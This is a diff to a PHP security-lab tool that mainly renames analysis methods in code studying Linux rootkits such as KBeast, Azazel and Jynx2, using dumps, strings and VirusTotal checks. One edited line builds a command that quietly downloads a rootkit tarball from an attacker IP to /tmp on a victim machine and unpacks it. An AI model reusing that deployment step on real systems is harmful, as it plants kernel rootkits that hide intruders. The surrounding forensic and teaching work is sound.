@@ -343,7 +343,7 @@ In order to hide a certain connection, i replaced the default read function with
         $attacker_ip = $this->ip4addr4target($this->ip);
         
         if(!$this->file4exist8path($stream, "/tmp/poc4rootkit4linux_kernel_avgcoder.tar.gz")){
-            $data = "wget http://$attacker_ip:$this->port_rfi/poc4rootkit4linux_kernel_avgcoder.tar.gz -O /tmp/poc4rootkit4linux_kernel_avgcoder.tar.gz";
+            $data = "wget http://$attacker_ip:$this->port_rfi/poc4rootkit4linux_kernel_avgcoder.tar.gz -qO /tmp/poc4rootkit4linux_kernel_avgcoder.tar.gz";
             $this->req_str($stream,$data,$this->stream_timeout,"");
             $data = "tar -xvzf $this->vm_tmp_lin/poc4rootkit4linux_kernel_avgcoder.tar.gz -C /tmp/";
             $this->req_str($stream,$data,$this->stream_timeout,"");
@@ -493,7 +493,7 @@ In order to hide a certain connection, i replaced the default read function with
              $lkm = trim($lkm);
              if (!empty($lkm)){
              $file_lkm = new bin4linux($lkm);
-             $file_lkm->file_file2virus4scan();
+             $file_lkm->file2virus4scan();
              }
          }
          $this->pause();
@@ -626,7 +626,7 @@ directories and processes.
         $this->ssTitre("send exec to virustotal");
         $victime->vm2download("/usr/_h4x_/_h4x_bd", "$this->vm_tmp_lin/_h4x_bd.elf");
         $check = new bin4linux("$this->vm_tmp_lin/_h4x_bd.elf");
-        //$check->file_file2virus2vt();
+        //$check->file2virus2vt();
         $this->pause();
         
         
@@ -752,7 +752,7 @@ directories and processes.
         $file_dump_module = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_Module_Kernel($inode_module, "");
         $file_name = $this->req_ret_str("grep -Po -i \"[0-9a-z._]*.lkm\" $file_dump_module");
         $check = new bin4linux("$this->file_dir/$this->file_name/$file_name");
-        $check->file_file2virus2vt();
+        $check->file2virus2vt();
         $this->pause();
         
         $this->ssTitre("Find hidden Files/Dir ");
@@ -784,15 +784,15 @@ directories and processes.
         
         $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/usr/_h4x_/acctlog.0", "");
         $malw = new file($file_exec);
-        $malw->file_file2strings();$this->pause();
+        $malw->file2strings();$this->pause();
         
         $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/usr/_h4x_/acctlog.1000", "");
         $malw = new file($file_exec);
-        $malw->file_file2strings();$this->pause();
+        $malw->file2strings();$this->pause();
         
         $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/usr/_h4x_/acctlog.2", "");
         $malw = new file($file_exec);
-        $malw->file_file2strings();$this->pause();
+        $malw->file2strings();$this->pause();
         
         
         
@@ -807,15 +807,15 @@ directories and processes.
         $this->pause();
         $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/proc/$pid/status", "");
         $malw = new file($file_exec);
-        $malw->file_file2strings();$this->pause();
+        $malw->file2strings();$this->pause();
         
         $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/proc/$ppid/status", "");
         $malw = new file($file_exec);
-        $malw->file_file2strings();$this->pause();
+        $malw->file2strings();$this->pause();
         
         $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/proc/$deamon/status", "");
         $malw = new file($file_exec);
-        $malw->file_file2strings();$this->pause();
+        $malw->file2strings();$this->pause();
         $this->pause();
         
         
@@ -826,8 +826,8 @@ directories and processes.
         $this->ssTitre("Dump Malware PATH");
         $file_exec = $rootkit4linux_kernel_kbeastv1->for4linux_Dump_file("/usr/_h4x_/_h4x_bd", "");
         $malw = new bin4linux($file_exec);
-        $malw->file_file2virus2vt();$this->pause();
-        $malw->file_file2strings();$this->pause();
+        $malw->file2virus2vt();$this->pause();
+        $malw->file2strings();$this->pause();
         $malw->elf2fonctions_externes();$this->pause();
         $malw->elf2fonctions_internes();$this->pause();
         
@@ -1043,13 +1043,13 @@ However, Rkhunter was not successful in discovering any hidden processes, hooked
         $for4linux_azazel->for4linux_Information_find_file_name('/etc/ld.so.preload', ""); $this->pause();
         $lib_preload_file = $for4linux_azazel->for4linux_Dump_file('/etc/ld.so.preload');$this->pause();
         $lib_preload = new bin4linux($lib_preload_file);
-        $lib_preload->file_file2strings();
+        $lib_preload->file2strings();
         $this->pause();
         $tmp_file = $for4linux_azazel->for4linux_Dump_file('/lib/libselinux.so');$this->pause();
         $malw = new bin4linux($tmp_file);
         $malw->elf2info();$this->pause();
-        $malw->file_file2virus2vt();$this->pause();
-        $malw->file_file2strings();$this->pause();
+        $malw->file2virus2vt();$this->pause();
+        $malw->file2strings();$this->pause();
         $malw->elf2fonctions_externes();$this->pause();
         $malw->elf2fonctions_internes();$this->pause();
         $this->pause();
@@ -1164,7 +1164,7 @@ By default, this action does not log to syslog.");
         $this->requette("strings $this->dir_tmp/jynx2.so");
         $this->pause();
         $check = new bin4linux("$this->dir_tmp/jynx2.so");
-        $check->file_file2virus2vt();
+        $check->file2virus2vt();
         $check->bin2fonctions();
         $check->elf2fonctions();
         $check->elf2struct();
